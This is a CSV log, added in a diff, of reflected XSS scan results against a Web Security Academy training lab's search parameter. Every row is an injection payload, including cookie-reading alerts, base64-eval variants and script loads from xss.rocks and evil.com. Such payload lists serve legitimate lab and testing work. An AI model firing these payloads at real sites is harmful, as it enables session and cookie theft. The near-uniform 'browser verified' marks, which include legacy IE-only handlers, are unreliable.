@@ -1,0 +1,566 @@
+Timestamp,Target_URL,HTTP_Method,Parameter,Payload,Reflection_Type,Browser_Verified,XSS_Event_Type,Severity
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>alert('XSS')</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<script>alert(""XSS"")</script>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>prompt(1)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>confirm(1)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>alert(document.cookie)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>alert(document.domain)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>alert(window.origin)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script src=//xss.rocks/xss.js></script>,RAW_REFLECTION,No,,High
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script src=https://evil.com/xss.js></script>,RAW_REFLECTION,No,,High
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<svg/onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<svg onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<svg><script>alert(1)</script></svg>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<svg><animate onbegin=alert(1) attributeName=x dur=1s>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<svg/onload=alert(String.fromCharCode(88,83,83))>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<svg onload=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<svg onload=confirm(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<svg onload=alert`1`>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<svg onload=eval(atob('YWxlcnQoMSk='))>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<svg><script>alert&#40;1&#41;</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onerror=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onerror=confirm(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onerror=alert('XSS')>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onerror=alert`1`>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onerror=alert(document.cookie)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img/src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<img src=""x"" onerror=""alert(1)"">",RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src='x' onerror='alert(1)'>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<body onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<body onpageshow=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<body onfocus=alert(1)>,RAW_REFLECTION,No,,High
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<body onhashchange=alert(1)>,RAW_REFLECTION,No,,High
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<body onload=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<body onload=confirm(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<input onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<input onblur=alert(1) autofocus><input>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<input type=text value=x onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<input type=button value=xss onclick=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<input type=image src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<iframe src=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<iframe src=""javascript:alert(1)"">",RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<iframe onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<iframe/onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<iframe  rc=""data:text/html,<script>alert(1)</script>"">",RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,'-alert(1)-',RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<details open ontoggle=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<details ontoggle=alert(1)><summary>xss</summary></details>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<details open ontoggle=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<object data=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<embed src=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<object data=""data:text/html,<script>alert(1)</script>"">",RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<select onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<textarea onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<keygen onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<marquee onstart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<marquee loop=1 onfinish=alert(1)>x</marquee>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<video src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<audio src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<video><source onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<link rel=stylesheet href=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<a href=javascript:alert(1)>click</a>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<a href=""javascript:alert(1)"">click</a>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<form action=javascript:alert(1)><input type=submit>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<form><button formaction=javascript:alert(1)>X</button>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<form><input formaction=javascript:alert(1) type=submit value=X>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<meta http-equiv=refresh content=0;url=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<meta http-equiv=refresh content=""0;javascript:alert(1)"">",RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<style>*{background:url('javascript:alert(1)')}</style>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<style>@import'javascript:alert(1)';</style>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<style onload=alert(1)></style>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<math><mi xlink:href=javascript:alert(1)>X</mi></math>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<table background=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<table><td background=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<div onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<div style=width:expression(alert(1))>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>alert&#40;1&#41;</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>alert&#x28;1&#x29;</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>\u0061lert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>eval('\x61lert(1)')</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onabort=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onactivate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onafterprint=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onafterupdate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onbeforeactivate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onbeforecopy=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onbeforecut=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onbeforedeactivate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onbeforeeditfocus=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onbeforepaste=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onbeforeprint=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onbeforeunload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onbeforeupdate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onblur=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onbounce=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x oncellchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onclick=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x oncontextmenu=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x oncontrolselect=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x oncopy=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x oncut=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x ondataavailable=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x ondatasetchanged=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x ondatasetcomplete=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x ondblclick=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x ondeactivate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x ondrag=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x ondragend=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x ondragenter=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x ondragleave=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x ondragover=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x ondragstart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x ondrop=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onerrorupdate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onfilterchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onfinish=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onfocus=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onfocusin=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onfocusout=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onhelp=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x oninput=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onkeydown=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onkeypress=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onkeyup=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onlayoutcomplete=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onlosecapture=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onmousedown=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onmouseenter=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onmouseleave=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onmousemove=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onmouseout=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onmouseover=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onmouseup=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onmousewheel=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onmove=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onmoveend=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onmovestart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onpaste=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onpropertychange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onreadystatechange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onreset=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onresize=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onresizeend=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onresizestart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onrowenter=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onrowexit=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onrowsdelete=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onrowsinserted=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onscroll=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onselect=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onselectionchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onselectstart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onstart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onstop=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onsubmit=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onunload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
